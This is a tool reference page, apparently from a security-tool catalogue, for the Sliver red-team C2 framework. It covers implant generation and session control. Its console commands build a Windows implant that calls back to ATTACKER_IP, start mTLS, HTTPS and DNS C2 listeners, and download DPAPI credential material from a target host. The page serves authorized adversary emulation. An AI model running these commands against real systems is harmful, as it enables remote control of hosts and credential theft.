---
name: "sliver"
categories:
  - blackarch-backdoor
version: "v1.7.8.r71.g56e1408"
homepage: "https://github.com/BishopFox/sliver"
packaged-by: [blackarch, aur]
blackarch-builddate: "2026-11-01"
build-system: go
license: BSD-3-Clause
meta-checked: "2026-11-09"
github-repo: "BishopFox/sliver"
github-stars: 12251
github-pushed: "2026-11-07"
github-archived: false
github-issues: 229
github-match: "exact"
gh-checked: "2026-11-07"
worth: 8.7
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 900
gh-activity-checked: "2026-11-09"
---

# sliver

> Open-source, cross-platform adversary emulation and red team framework: server-compiled implants with unique per-binary keypairs, C2 over mTLS, HTTP(S), DNS and WireGuard, and a multiplayer operator console.

## What it's for

Sliver (BishopFox) is an open-source C2/adversary-emulation framework for authorized security testing. The server dynamically compiles implant binaries on demand — Go implants for Windows, macOS and Linux, each build carrying its own asymmetric keypair, with shellcode and service formats, userspace reflective loading and BOF/COFF execution on amd64 and arm64 — which makes every artifact structurally unique. C2 channels are mutual TLS (default listener port 8888), HTTP(S), DNS and WireGuard, and implants operate either as interactive sessions or as beacons on a check-in interval. Operators drive everything from an interactive console (`sliver`), and multiple operators can share one server in multiplayer mode. The patterns below cover its core loop: generate an implant against an mTLS listener, run it, interact with the session, pull files.

Flag syntax below is verified against the v1.7.8 source: `generate` uses `--name`/`-N` for implant names (older guides' `-n` now belongs to `--dns`), so prefer long flags when following them.

## Typical use cases

### Generate a Windows implant that calls back over mTLS

Compile a named implant bound to your C2 endpoint.

```
sliver > generate --mtls ATTACKER_IP:8888 --os windows --arch amd64 --name wedged-sabre --save .
```

Outcome: the server cross-compiles `wedged_sabre.exe` into the current directory, embedding the mTLS callback and a per-binary keypair; run it on the target and it attempts a session to your mTLS listener.

### Start an mTLS listener

Open the listener the generated implant expects.

```
sliver > mtls --lhost ATTACKER_IP
```

Outcome: starts the mutual-TLS listener on the default port 8888 (`--lport` overrides) and prints the job id; with the implant executed on the target, a session appears in `sessions`.

### Open HTTPS or DNS listeners instead

Blend C2 into traffic a firewall already allows.

```
sliver > https --lhost ATTACKER_IP --lport 443
sliver > dns --domains c2.corp.example.com --lhost ATTACKER_IP
```

Outcome: starts HTTPS and DNS C2 jobs; generate matching implants with `--http ATTACKER_IP:443` or `--dns c2.corp.example.com` in place of `--mtls` (WireGuard is the remaining option, via `--wg`).

### List sessions and interact with one

Move from session list to a live implant shell.

```
sliver > sessions
sliver > sessions -i 1
sliver (WEDGED-SABRE) > whoami
sliver (WEDGED-SABRE) > download "C:\Users\user\AppData\Roaming\Microsoft\Protect"
```

Outcome: `sessions` tables every check-in; `-i` attaches an interactive prompt scoped to that implant; implant-side commands like `whoami` and `download` execute on the target and transfer files back to the server — the corpus pattern for pulling DPAPI-protected credential material off a host.

### Run the server for multiple operators

Share one server across a team with per-operator configs.

```
sliver-server operator -n alice -l ATTACKER_IP -p 31337 -s .
sliver-server daemon -l 0.0.0.0 -p 31337
```

Outcome: the first command mints an operator config file (e.g. `alice_ATTACKER_IP.cfg`) for the multiplayer listener on TCP 31337; the second runs the server headless with that multiplayer listener exposed. Each operator drops their .cfg into `~/.sliver-client/configs/` and connects with `sliver` to see the same sessions.
